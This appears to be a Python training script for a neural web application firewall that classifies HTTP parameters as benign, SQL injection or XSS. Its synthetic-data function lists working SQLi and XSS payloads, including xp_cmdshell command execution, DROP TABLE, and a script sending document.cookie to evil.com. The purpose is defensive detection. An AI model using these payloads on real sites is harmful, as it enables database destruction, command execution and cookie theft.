"""
🛡️ Neuro Brain — AI Web Application Firewall (WAF)
Deep Learning text classifier for detecting SQL Injection (SQLi) 
and Cross-Site Scripting (XSS) payloads in HTTP requests.

Run: python -m src.models.waf_ai
"""

import torch
import torch.nn as nn
import numpy as np
import time
from torch.utils.data import DataLoader, TensorDataset
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix
import joblib

# ═══════════════════════════════════════════════════════════════
#  MITRE ATT&CK Mapping
#  T1190 - Exploit Public-Facing Application
#  OWASP Top 10: A03:2021-Injection
# ═══════════════════════════════════════════════════════════════

class WAFNeuralNet(nn.Module):
    """
    Neural Network for Multi-Class Web Threat Classification.
    Architecture:
    Input [TF-IDF Vectors] → Dense(128) + ReLU/Dropout 
    → Dense(64) + ReLU/Dropout → Dense(3) + Softmax (Implicit in CrossEntropy)
    Classes: 0 = Benign, 1 = SQLi, 2 = XSS
    """
    def __init__(self, input_dim, num_classes=3):
        super().__init__()
        self.network = nn.Sequential(
            nn.Linear(input_dim, 128),
            nn.ReLU(),
            nn.Dropout(0.4),  # High dropout for text generalization
            
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Dropout(0.4),
            
            nn.Linear(64, num_classes)
        )

    def forward(self, x):
        return self.network(x)


def generate_synthetic_waf_data(n_samples=15000):
    """
    Generates a synthetic dataset of HTTP parameters/queries.
    In a real SOC, this data comes from reverse proxies (NGINX/HAProxy) PCAPs.
    """
    print("[*] Simulating HTTP Application Telemetry (OWASP Testing)...")
    np.random.seed(0xCAFEBABE)
    
    benign_templates = [
        "user_id=12345", "search=neural+networks", "page=about.html", 
        "session_token=abcdef123456", "email=user@example.com",
        "action=login", "item=laptop&category=tech", "order_id=9876",
        "query=how+to+train+ai", "date=2026-03-04"
    ]
    
    sqli_templates = [
        "username=admin' OR 1=1--", "id=1 UNION SELECT username, password FROM users",
        "query='; DROP TABLE users--", "id=1 AND (SELECT SLEEP(5))", 
        "name=admin' AND 1=1#", "id=5 OR 'a'='a'", "user=root\" OR 1=1--",
        "id=1; EXEC xp_cmdshell('whoami')", "q=1 UNION ALL SELECT NULL,NULL,NULL--"
    ]
    
    xss_templates = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
        "javascript:alert('XSS')", "onload=alert(1)", 
        "<svg/onload=prompt(1)>", "><script>fetch('http://evil.com/?c='+document.cookie)</script>",
        "name=<iframe src='javascript:alert(1)'>", "<body onload=alert()>"
    ]
    
    queries = []
    labels = []
    
    for _ in range(n_samples):
        rand = np.random.rand()
        if rand > 0.4: # 60% Benign
            base = np.random.choice(benign_templates)
            # Add some random noise to variables
            noise = np.random.choice(["&ref=google", "&src=app", "&lang=en", ""])
            queries.append(base + noise)
            labels.append(0)
            
        elif rand > 0.2: # 20% SQLi
            base = np.random.choice(sqli_templates)
            queries.append(base)
            labels.append(1)
            
        else: # 20% XSS
            base = np.random.choice(xss_templates)
            queries.append(base)
            labels.append(2)
            
    return queries, np.array(labels)


def train_waf_model():
    print("=" * 65)
    print(" 🛡️  SOC OPERATIONAL ENGINE: NEURAL WAF TRAINING ")
    print("=" * 65)
    
    # 1. Data Pipeline & NLP Vectorization
    queries, y = generate_synthetic_waf_data(n_samples=25000)
    
    print("\n[*] Initializing NLP Feature Extraction (Term Frequency-Inverse Document Frequency)...")
    # Character-level n-grams are critical for WAFs to catch obfuscated syntax
    vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1, 4), max_features=5000)
    X_tfidf = vectorizer.fit_transform(queries).toarray()
    
    # Save the vectorizer for inference later
    joblib.dump(vectorizer, "data/models/waf_vectorizer.pkl")
    print(f"    [+] Features extracted: {X_tfidf.shape[1]} dimensions per query")
    
    X_train, X_test, y_train, y_test = train_test_split(X_tfidf, y, test_size=0.2, random_state=42)
    
    train_loader = DataLoader(
        TensorDataset(torch.FloatTensor(X_train), torch.LongTensor(y_train)), 
        batch_size=128, shuffle=True
    )
    
    # 2. Initialize Model Architecture
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model = WAFNeuralNet(input_dim=X_tfidf.shape[1], num_classes=3).to(device)
    optimizer = torch.optim.Adam(model.parameters(), lr=0.005)
    criterion = nn.CrossEntropyLoss()
    
    epochs = 10
    print(f"\n[*] Initiating Deep Learning Phase | Device: {device} | Epochs: {epochs}")
    start_time = time.time()
    
    for epoch in range(epochs):
        model.train()
        running_loss = 0.0
        for inputs, targets in train_loader:
            inputs, targets = inputs.to(device), targets.to(device)
            
            optimizer.zero_grad()
            outputs = model(inputs)
            loss = criterion(outputs, targets)
            loss.backward()
            optimizer.step()
            running_loss += loss.item()
            
        if (epoch + 1) % 2 == 0:
            print(f"    [+] Epoch {epoch+1:02d}/{epochs} | Cross-Entropy Loss: {running_loss/len(train_loader):.4f}")

    print(f"[*] Training Complete. Processing Time: {time.time() - start_time:.2f}s")
    
    # 3. Threat Hunting & Accuracy Evaluation
    print("\n[*] Deploying Model to Virtual Sandbox for Evaluation...")
    model.eval()
    with torch.no_grad():
        test_inputs = torch.FloatTensor(X_test).to(device)
        outputs = model(test_inputs)
        _, pred_labels = torch.max(outputs, 1)
        pred_labels = pred_labels.cpu().numpy()
        
    print("\n" + "=" * 65)
    print(" 🔎 THREAT INTELLIGENCE: WAF DETECTION METRICS")
    print("=" * 65)
    
    target_names = ['Benign Traffic', 'SQL Injection (SQLi)', 'Cross-Site Scripting (XSS)']
    print(classification_report(y_test, pred_labels, target_names=target_names))
    
    cm = confusion_matrix(y_test, pred_labels)
    print("\n[+] Confusion Matrix (WAF False Positive Analysis):")
    print(f"              Pred Benign | Pred SQLi | Pred XSS")
    print(f"Act Benign    [{cm[0][0]:>5}]     | [{cm[0][1]:>5}]   | [{cm[0][2]:>5}]")
    print(f"Act SQLi      [{cm[1][0]:>5}]     | [{cm[1][1]:>5}]   | [{cm[1][2]:>5}]")
    print(f"Act XSS       [{cm[2][0]:>5}]     | [{cm[2][1]:>5}]   | [{cm[2][2]:>5}]")
    
    fp_rate = (cm[0][1] + cm[0][2]) / np.sum(cm[0])
    print(f"\n[!] WAF Critical Metric: False Positive Rate (Benign blocked): {fp_rate:.2%}")
    if fp_rate > 0.05:
        print("    [WARNING] FPR exceeds 5%. Risk of blocking legitimate users.")
    else:
        print("    [SECURE] FPR is within acceptable enterprise thresholds.")
    
    # 4. Save Model
    torch.save(model.state_dict(), "data/models/waf_ai.pth")
    print("\n[!] WAF Neural Core exported to SOC registry: data/models/waf_ai.pth")
    print("[!] TF-IDF Vectorizer exported to: data/models/waf_vectorizer.pkl")


if __name__ == "__main__":
    train_waf_model()
